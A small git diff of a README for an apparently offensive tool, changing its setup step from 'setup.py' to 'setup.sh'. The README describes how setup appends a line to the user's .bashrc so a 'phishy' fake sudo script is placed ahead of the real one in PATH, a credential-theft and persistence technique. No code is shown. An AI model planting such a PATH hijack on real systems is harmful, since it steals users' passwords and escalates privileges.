@@ -2,7 +2,7 @@
 
 ### Setup:
 1. Clone into an obscure directory
-2. Run `setup.py`
+2. Run `setup.sh`
 
 This adds a line to the user's `.bashrc` which prepends the path to the phishy sudo script (`bin/sudo`) to the `PATH` environment variable every time a new session is created. 
 
